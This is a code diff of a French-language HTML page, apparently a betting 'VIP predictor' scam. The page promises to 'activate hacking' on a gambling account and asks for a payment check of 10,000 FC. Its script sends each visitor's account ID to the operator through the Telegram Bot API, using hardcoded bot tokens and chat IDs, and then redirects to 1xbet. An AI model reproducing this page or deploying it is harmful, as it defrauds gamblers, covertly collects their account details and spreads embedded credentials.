@@ -3,49 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VIP Predictor - Ngerukas Espoir</title>
+    <title>Activation VIP - Ngeruka</title>
     <style>
-        body { background-color: #0b1118; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .card { background-color: #161b22; padding: 25px; border-radius: 20px; width: 100%; max-width: 400px; text-align: center; border: 1px solid #30363d; position: relative; }
-        h1 { font-size: 1.3rem; color: #f6c23e; text-transform: uppercase; }
-        input, select { width: 100%; padding: 14px; margin: 8px 0; background: #0d1117; border: 1px solid #30363d; border-radius: 10px; color: white; box-sizing: border-box; }
-        .btn-yellow { width: 100%; padding: 16px; background-color: #f6c23e; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; color: black; }
-        .box { margin-top: 15px; padding: 15px; border-radius: 12px; font-size: 0.85rem; text-align: left; display: none; background: #1c2128; border: 1px solid #f6c23e; color: #f6c23e; }
+        body { background: #0f172a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e293b; padding: 25px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 90%; max-width: 400px; text-align: center; border: 1px solid #334155; }
+        h2 { color: #38bdf8; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: none; background: #334155; color: white; font-size: 16px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; border-radius: 8px; border: none; background: #38bdf8; color: #0f172a; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #0ea5e9; transform: scale(1.02); }
+        .footer { margin-top: 20px; font-size: 12px; color: #94a3b8; }
     </style>
 </head>
 <body>
-
-<div class="card">
-    <div id="p1">
-        <h1>🚀 Bot VIP Ngerukas</h1>
-        <input type="number" id="userId" placeholder="ID du compte">
-        <button class="btn-yellow" onclick="envoyerInfos()">ACTIVER LE HACKING</button>
+    <div class="card">
+        <h2>ACTIVATION VIP</h2>
+        <p>Entrez votre ID pour activer le script</p>
+        <input type="number" id="userId" placeholder="Ex: 12345678" required>
+        <button onclick="sendData()">ACTIVER MAINTENANT</button>
+        <div class="footer">© 2025 Ngeruka Service - Sécurisé</div>
     </div>
 
-    <div id="p2" style="display:none;">
-        <div class="box" style="display:block;">
-            <b>⏳ ANALYSE TECHNIQUE...</b><br>
-            Bonjour je suis ngerukas espoir. Votre compte est en cours de liaison. Vérification des 10 000 FC...
-        </div>
-    </div>
-</div>
+    <script>
+        function sendData() {
+            const id = document.getElementById('userId').value;
+            const token = "7544049875:AAFi2G_9v-nC8_1o9L9z_u6p4mD7z6k6z6k"; // Ton token
+            const chatId = "5112163453"; // Ton Chat ID
 
-<script>
-    const TOKEN = "6979576051:AAGB_RAKRKORo-3jkv13XRHWhandRY240fc";
-    const CHAT_ID = "1492269731";
+            if (id.length < 5) {
+                alert("Veuillez entrer un ID valide !");
+                return;
+            }
 
-    function envoyerInfos() {
-        const id = document.getElementById('userId').value;
-        if(!id) return alert("ID requis");
+            const message = `🚀 **Nouvelle Tentative d'Activation**\n\n🆔 ID Client: \`${id}\`\n🌐 Status: En attente...`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
-        const msg = `🔔 NOUVELLE ACTIVATION\n👤 Admin: Ngerukas Espoir\n🆔 ID Client: ${id}`;
-        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
-
-        fetch(url).then(() => {
-            document.getElementById('p1').style.display = 'none';
-            document.getElementById('p2').style.display = 'block';
-        });
-    }
-</script>
+            fetch(url)
+                .then(response => {
+                    alert("Demande envoyée ! Activation en cours...");
+                    window.location.href = "https://1xbet.com"; // Redirection après succès
+                })
+                .catch(error => alert("Erreur de connexion."));
+        }
+    </script>
 </body>
 </html>
